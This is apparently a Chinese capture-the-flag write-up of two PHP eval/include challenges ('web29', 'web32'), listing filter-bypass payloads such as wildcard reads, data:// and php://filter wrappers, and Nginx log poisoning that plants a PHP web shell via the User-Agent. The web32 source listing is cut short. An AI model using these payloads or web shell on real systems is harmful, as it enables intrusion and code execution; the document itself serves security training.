web29

<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}

?c=system(ls);

得知 flag.php

题目过滤了 flag，所以用通配符 * 来读取

?c=system(‘tac f*’);

这道题解法也是五花八门，还可以：

  1. ?c=echo`tac f*`; （两个反引号的作用是执行命令并返回字符串，但要用 echo 才能看到回显）
  2. ?c=eval($_GET[1]);&1=system(‘tac f*’);
  3. ?c=system (“cp fl*g.php a.txt”); （用 cp 将 flag 拷贝成 a.txt，然后再访问 a.txt 即可）

web32

<?php

error_reporting(0);

    highlight_file(__FILE__);
}
  1. 这题把常见的指令都禁用掉了，但是可以用 include。

利用参数中转绕过过滤，再用伪协议读一下目录

?c=include$_GET[1]?>&1=data://text/plain,<?php system(‘ls’);?>

?> ：PHP 的结束标签。因为分号被过滤了，所以使用这个来替代

得知 flag.php

?c=include$_GET[1]?>&1=data://text/plain,<?php system(‘tac flag.php’);?>

或者

?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

以 base64 输出，解码一下就得到了 flag

  1. 还可以利用日志注入方法

通过插件知道使用的是 Nginx 服务，所以日志文件在 var/log/nginx/access.log

?c=include%22$_GET[a]%22?%3E&a=/var/log/nginx/access.log

访问的时候将 ua 改成 <?php @eval ($_POST [‘cmd’]); ?>

打开蚁剑就能连上了
